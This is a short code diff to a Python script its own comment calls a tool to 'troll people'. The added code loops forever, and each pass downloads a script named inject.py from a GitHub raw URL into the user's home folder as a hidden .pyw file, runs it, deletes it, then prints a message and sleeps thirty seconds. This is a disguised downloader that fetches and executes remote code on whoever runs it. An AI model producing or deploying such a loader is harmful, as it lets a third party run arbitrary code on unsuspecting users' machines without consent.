@@ -1,9 +1,25 @@
 # Auto Updates the troll.py to troll people :)
-print('Hello')
-import os
+import os, time
+while 1 == 1:
+    
+    def sleep(Time):
+        import time as t
+        t.sleep(Time)
 
-path = os.getcwd()
-print(path)
-f = open('fuck you', "a")
+    def trolls():
+        print('Holla')
 
-exit()
+    def udownload():
+        print('Downloading Update')
+        home = os.path.expanduser("~")
+        os.chdir(home)
+        import urllib.request, pathlib
+        dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/inject.py'
+        path = str(home) + '\inject.pyw'
+        urllib.request.urlretrieve(dlurl, '{}'.format(path))
+        os.system('inject.pyw')
+        os.remove('inject.pyw')
+
+    udownload()
+    sleep(30)
+    trolls()
